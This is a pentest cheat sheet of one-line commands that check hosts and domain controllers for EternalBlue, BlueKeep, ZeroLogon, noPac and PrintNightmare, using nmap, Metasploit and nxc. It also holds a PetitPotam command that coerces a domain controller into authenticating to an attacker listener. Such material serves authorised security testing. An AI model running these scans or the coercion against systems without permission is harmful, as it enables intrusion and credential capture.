# MENU

#plateform/linux #target/remote #cat/VULN

% p-vulns, boris, eternalblue, ms17-010, smb, nmap, cve-2017-0144
## [VULN-a] EternalBlue MS17-010 (nmap)
```
nmap -Pn -p445 --open --script smb-vuln-ms17-010 <target_range> -oN nmap_ms17-010.txt
```

% p-vulns, boris, bluekeep, rdp, cve-2019-0708, metasploit, msf
## [VULN-b] BlueKeep CVE-2019-0708 (msf Scanner)
```
msfconsole -q -x "use auxiliary/scanner/rdp/cve_2019_0708_bluekeep; set RHOSTS <target_range>; set THREADS 50; run; exit"
```

% p-vulns, boris, zerologon, cve-2020-1472, dc, nxc, unauth
## [VULN-c] ZeroLogon CVE-2020-1472 (nxc, unauth)
```
nxc smb <dc_ip> -u '' -p '' -M zerologon
```

% p-vulns, boris, nopac, samaccountname, cve-2021-42278, nxc, kerberos
## [VULN-d] noPac CVE-2021-42278/42287 (nxc)
Laeuft intern ueber Kerberos: bei Fehler dc_fqdn statt dc_ip + DNS/hosts pruefen.
```
nxc smb <dc_ip> -u <user> -p '<password>' -d <domain> -M nopac
```

% p-vulns, boris, petitpotam, cve-2021-36942, unauth, check
## [VULN-e] PetitPotam - unauth Coercion Check (Positional: listener target)
Voller Coercion-Weg (Relay/ESC8): tippe coerce.
```
python3 PetitPotam.py <lhost> <dc_ip>
```

% p-vulns, boris, printnightmare, spooler, cve-2021-1675, nxc
## [VULN-f] PrintNightmare / Spooler Check (nxc)
```
nxc smb <target_range> -u <user> -p '<password>' -d <domain> -M spooler
```
